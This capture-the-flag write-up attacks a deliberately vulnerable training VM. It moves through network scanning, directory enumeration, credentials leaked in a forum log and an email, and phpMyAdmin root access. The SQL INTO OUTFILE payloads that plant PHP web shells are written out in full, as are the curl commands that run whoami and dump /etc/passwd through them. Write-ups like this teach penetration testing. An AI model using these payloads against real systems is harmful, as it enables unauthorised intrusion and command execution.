# WRITEUP1

After installing and launching the VM, we are asked for a password and the machine's ip address is not indicated.
We are looking to scan an open port from our vm, for that, we configure the network of our vm (on VM box) in bridge access.
We are trying to find a potential ip address created by the VM:

```bash
λ arp -a

Interface : 192.168.99.1 --- 0x6
  Adresse Internet      Adresse physique      Type
  192.168.99.255        ff-ff-ff-ff-ff-ff     statique
  ....

Interface : 192.168.1.26 --- 0x8
  Adresse Internet      Adresse physique      Type
  192.168.1.1           6c-ba-b8-be-0a-20     dynamique
  192.168.1.10          20-9a-7d-c0-45-d5     dynamique
  192.168.1.11          78-dd-12-93-0b-02     dynamique
  192.168.1.12          ec-b5-fa-31-6f-1f     dynamique
  192.168.1.13          48-ba-4e-c5-ce-7e     dynamique
  192.168.1.14          48-d6-d5-71-33-6d     dynamique
  192.168.1.15          42-e5-79-05-cc-33     dynamique
  192.168.1.16          84-b8-b8-04-7f-fb     dynamique
  192.168.1.17          e0-ac-cb-33-5b-bf     dynamique
  192.168.1.22          08-00-27-99-d9-06     dynamique
  224.0.0.250           01-00-5e-00-00-fa     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  224.0.1.60            01-00-5e-00-01-3c     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  239.255.255.251       01-00-5e-7f-ff-fb     statique
  ...

```
We can also find the ip address directly in the router's configs.

Now, we try to test the `dynamic` type addresses with the `ping` command.
Several addresses send back a `pong`, we can try them one by one with `nmap` to see if anything is up on those:

```bash
λ nmap 192.168.1.22 
Nmap scan report for IP (IP)
Host is up (0.0055s latency).
Not shown: 987 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s
Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
```

The address `192.168.1.22` has a website that shows us a page with` HACK ME` written in it. After various tests and some research we finded different ways to discover other accessible pages.
  
We used `web scanners` `Arachni`, `dirb` and`nikto`, all present by default on the `kali` OS.

We will be working with the `Kali` OS on`wsl` from now on because it includes most of the `Pen Testing` tools that we will need later.

```bash
└─$ dirb https://192.168.1.22/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Sep  8 13:21:51 2021
URL_BASE: https://192.168.1.22/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.1.22/ ----
+ https://192.168.1.22/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://192.168.1.22/forum/
==> DIRECTORY: https://192.168.1.22/phpmyadmin/
+ https://192.168.1.22/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://192.168.1.22/webmail/
```

  
Thanks to these `web scanners` we identify new accessible pages:`/forum`, `/phpmyadmin`,`/webmail`. In the forum post `Login problem?`, We can see connection attempts with different usernames and what looks like a password:

```bash
Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Failed password for invalid user !q\\\]Ej?\*5K5cy\*AJ from 161.202.39.38 port 57764 ssh2  
Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail \[preauth\]  
Oct 5 08:46:01 BornToSecHackMe CRON\[7549\]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

We managed to log in with the username `lmezard` and the password `!q\\\]Ej?\*5K5cy\*AJ` to the forum. On the user's profile we can get the user's email address: `laurie@borntosec.net`. We try to log into `http://192.168.1.22/webmail` with the email address and the previous password. We connect successfully.
One of the user's emails gives us access to the `phpmyadmin` page:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

phpmyadmin user: `root`
phpmyadmin password: `Fg-'kKXBj87E:aJ$`

Now that we have root access to the SQL database, we are trying to do an exploit called `web shell`. Thanks to `dirb` we can obtain a list of the directories used by the site:

```bash
└─$ dirb https://192.168.1.22/forum/

...

==> DIRECTORY: https://192.168.1.22/forum/js/
==> DIRECTORY: https://192.168.1.22/forum/lang/
==> DIRECTORY: https://192.168.1.22/forum/modules/
==> DIRECTORY: https://192.168.1.22/forum/templates_c/
==> DIRECTORY: https://192.168.1.22/forum/themes/
==> DIRECTORY: https://192.168.1.22/forum/update/

└─$ dirb https://192.168.1.22/webmail/

...

==> DIRECTORY: https://192.168.1.22/webmail/plugins/
==> DIRECTORY: https://192.168.1.22/webmail/src/
==> DIRECTORY: https://192.168.1.22/webmail/themes/
```

We are trying to get the default folder from the web server:

```bash
└─$ whatweb https://192.168.1.22/
https://192.168.1.22/ [404 Not Found] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.1.22], Title[404 Not Found]
```
The server is running on Apache 2 so `/var/www` should be the default folder.

We try to create a new page that will allow us to use the `shell`. For that we use the command `SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/{folder}/{filename}.php" -- 1`
with the different folders available to find one with write rights. We manage to write our file in the `templates_c` folder.

The sql request to create our `web_shell` file:

```sql
SELECT "<html><body><pre><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><?php if(isset($_GET['cmd'])){echo 'Shell: ';system($_GET['cmd']);}?></pre></body></html>" INTO OUTFILE '/var/www/forum/templates_c/web_shell.php'
```

a simplify option without the `html` for `curl`:

```sql
SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/curl_shell.php'
```

We retrieve the name of our user:

```bash
└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=whoami
www-data
```

We list the other users:

```bash
└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=cat+/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

